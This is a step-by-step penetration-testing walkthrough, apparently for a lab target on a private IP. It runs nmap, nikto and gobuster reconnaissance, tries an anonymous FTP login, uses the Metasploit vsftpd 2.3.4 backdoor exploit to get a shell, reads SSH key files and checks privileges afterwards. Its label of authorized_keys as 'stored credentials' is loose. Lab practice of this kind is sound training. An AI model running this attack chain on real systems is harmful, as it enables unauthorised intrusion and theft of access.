🔴 STEP 1 — Check Attacker Machine IP
ifconfig
📌 Purpose: Identify Kali Linux IP address.
🔴 STEP 2 — Check Connectivity
ping 192.168.86.129
📌 Purpose: Verify attacker can reach target machine.
🔴 STEP 3 — Network Reconnaissance
Scan Open Ports
nmap -sV 192.168.86.129
📌 Purpose:
Discover running services
Identify versions
Scan Specific Ports
nmap -p 21,22,80 192.168.86.129
📌 Purpose:
FTP
SSH
HTTP
🔴 STEP 4 — Banner Grabbing
nc 192.168.86.129 21
📌 Purpose:
Identify FTP version (vsftpd 2.3.4 vulnerable).
🔴 STEP 5 — Web Enumeration
nikto -h http://192.168.86.129
📌 Purpose:
Find web vulnerabilities.
🔴 STEP 6 — Directory Brute Force
gobuster dir -u http://192.168.86.129 -w /usr/share/wordlists/dirb/common.txt
📌 Purpose:
Discover hidden directories.
🔴 STEP 7 — SSH Enumeration
nmap -p 22 --script ssh2-enum-algos 192.168.86.129
📌 Purpose:
Check SSH weak algorithms.
🔴 STEP 8 — FTP Login Test
ftp 192.168.86.129
Try:
username: anonymous
password: anonymous
🔴 STEP 9 — Exploitation (Metasploit)
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.86.129
run
📌 Purpose:
Gain shell access.
🔴 STEP 10 — Credential Harvesting
cat ~/.ssh/authorized_keys
📌 Purpose:
Extract stored credentials.
🔴 STEP 11 — Post Exploitation
whoami
id
uname -a
📌 Purpose:
Check privilege level & system info.
